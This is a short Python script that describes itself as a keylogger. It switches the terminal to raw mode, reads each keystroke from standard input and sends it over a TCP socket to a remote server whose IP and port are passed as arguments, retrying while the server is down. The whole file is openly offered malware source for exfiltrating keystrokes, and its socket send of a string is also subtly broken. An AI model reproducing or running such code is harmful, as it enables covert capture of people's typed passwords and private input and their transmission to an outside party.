#!/bin/python

# this program is a keylogger that logs and sends the keys to a server wich IP and port as in arguments

import socket
import sys
import time
import os
import tty
import termios

# the server IP and port
ip = sys.argv[1]
port = int(sys.argv[2])

# check if the server is up
def check_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    try:
        s.connect((ip, port))
        s.close()
        return True
    except:
        return False
    
# send the keys to the server
def send_keys(keys):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(keys)
    print(f"sent keys: {keys}")
    s.close()


def keylogger():
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try :
        tty.setraw(sys.stdin.fileno())
        while True:
            try:
                ch = sys.stdin.read(1)
                if ch == '\x03':
                    break
                send_keys(ch)
                print(ch,end='',flush=True)
            except KeyboardInterrupt:
                break
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)

# main
if __name__ == "__main__":
    while True:
        if check_server():
            keylogger()
        else:
            print("server is down")
            time.sleep(1)